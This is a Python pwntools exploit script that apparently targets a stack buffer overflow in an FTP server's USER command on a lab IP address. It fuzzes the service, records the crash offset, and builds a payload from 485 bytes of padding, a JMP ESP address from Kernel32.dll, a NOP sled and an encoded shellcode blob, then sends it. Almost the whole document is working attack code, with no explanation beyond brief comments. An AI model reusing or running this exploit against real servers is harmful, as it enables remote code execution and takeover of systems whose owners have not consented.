#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = './path/to/binary'

host = args.HOST or '192.168.34.148'
port = int(args.PORT or 21)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

def fuzz():
    print('Fuzzing target....')
    for i in range(0, 3000, 100):

        info(f'Sending length: {str(i)}')
        payload = cyclic(i)

        try:
            io = start()
        except PwnlibException as e:
            quit()

        io.sendline(f'USER {payload}')
        io.close()

#fuzz()
# Crash at 61617665 - 483

jmpesp = '\x7b\x46\x86\x7c' # Kernel32.dll

# bad bytes: 00, 0a, 0d, 40
shellcode =  ""
shellcode += "\xb8\xda\x9e\xb7\xbb\xdb\xc7\xd9\x74\x24\xf4"
shellcode += "\x5b\x31\xc9\xb1\x52\x83\xc3\x04\x31\x43\x0e"
shellcode += "\x03\x99\x90\x55\x4e\xe1\x45\x1b\xb1\x19\x96"
shellcode += "\x7c\x3b\xfc\xa7\xbc\x5f\x75\x97\x0c\x2b\xdb"
shellcode += "\x14\xe6\x79\xcf\xaf\x8a\x55\xe0\x18\x20\x80"
shellcode += "\xcf\x99\x19\xf0\x4e\x1a\x60\x25\xb0\x23\xab"
shellcode += "\x38\xb1\x64\xd6\xb1\xe3\x3d\x9c\x64\x13\x49"
shellcode += "\xe8\xb4\x98\x01\xfc\xbc\x7d\xd1\xff\xed\xd0"
shellcode += "\x69\xa6\x2d\xd3\xbe\xd2\x67\xcb\xa3\xdf\x3e"
shellcode += "\x60\x17\xab\xc0\xa0\x69\x54\x6e\x8d\x45\xa7"
shellcode += "\x6e\xca\x62\x58\x05\x22\x91\xe5\x1e\xf1\xeb"
shellcode += "\x31\xaa\xe1\x4c\xb1\x0c\xcd\x6d\x16\xca\x86"
shellcode += "\x62\xd3\x98\xc0\x66\xe2\x4d\x7b\x92\x6f\x70"
shellcode += "\xab\x12\x2b\x57\x6f\x7e\xef\xf6\x36\xda\x5e"
shellcode += "\x06\x28\x85\x3f\xa2\x23\x28\x2b\xdf\x6e\x25"
shellcode += "\x98\xd2\x90\xb5\xb6\x65\xe3\x87\x19\xde\x6b"
shellcode += "\xa4\xd2\xf8\x6c\xcb\xc8\xbd\xe2\x32\xf3\xbd"
shellcode += "\x2b\xf1\xa7\xed\x43\xd0\xc7\x65\x93\xdd\x1d"
shellcode += "\x29\xc3\x71\xce\x8a\xb3\x31\xbe\x62\xd9\xbd"
shellcode += "\xe1\x93\xe2\x17\x8a\x3e\x19\xf0\x75\x16\x03"
shellcode += "\x8a\x1e\x65\x43\xad\xd1\xe0\xa5\xdb\xfd\xa4"
shellcode += "\x7e\x74\x67\xed\xf4\xe5\x68\x3b\x71\x25\xe2"
shellcode += "\xc8\x86\xe8\x03\xa4\x94\x9d\xe3\xf3\xc6\x08"
shellcode += "\xfb\x29\x6e\xd6\x6e\xb6\x6e\x91\x92\x61\x39"
shellcode += "\xf6\x65\x78\xaf\xea\xdc\xd2\xcd\xf6\xb9\x1d"
shellcode += "\x55\x2d\x7a\xa3\x54\xa0\xc6\x87\x46\x7c\xc6"
shellcode += "\x83\x32\xd0\x91\x5d\xec\x96\x4b\x2c\x46\x41"
shellcode += "\x27\xe6\x0e\x14\x0b\x39\x48\x19\x46\xcf\xb4"
shellcode += "\xa8\x3f\x96\xcb\x05\xa8\x1e\xb4\x7b\x48\xe0"
shellcode += "\x6f\x38\x68\x03\xa5\x35\x01\x9a\x2c\xf4\x4c"
shellcode += "\x1d\x9b\x3b\x69\x9e\x29\xc4\x8e\xbe\x58\xc1"
shellcode += "\xcb\x78\xb1\xbb\x44\xed\xb5\x68\x64\x24"

payload = 'A' * 485 + jmpesp + '\x90' * 32 + shellcode

io = start()

info(io.recv(4096))
io.sendline(f'USER {payload}')
info(io.recv(4096))
io.sendline(f'PASS Reeeee')
io.close()
